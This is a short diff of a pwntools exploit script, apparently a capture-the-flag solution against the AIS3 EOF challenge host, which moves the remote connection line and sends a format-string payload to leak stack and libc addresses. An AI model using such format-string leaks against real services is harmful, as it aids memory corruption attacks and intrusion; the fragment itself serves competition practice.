@@ -2,8 +2,9 @@
 from pwn import *
 
 context.arch = 'amd64'
-
 l = ELF( './libc-2.27.so' )
+
+y = remote( 'eof.ais3.org' , 6666 )
 
 def fmt( p , r = True ):
     if r:
@@ -13,8 +14,6 @@ def fmt( p , r = True ):
         y.send( p + '\0' )
         sleep( 0.16 )
 
-
-y = remote( 'eof.ais3.org' , 6666 )
 
 fmt( '%10$p.%6$p.%5$p.' , False )
 y.recvuntil( '0x' )
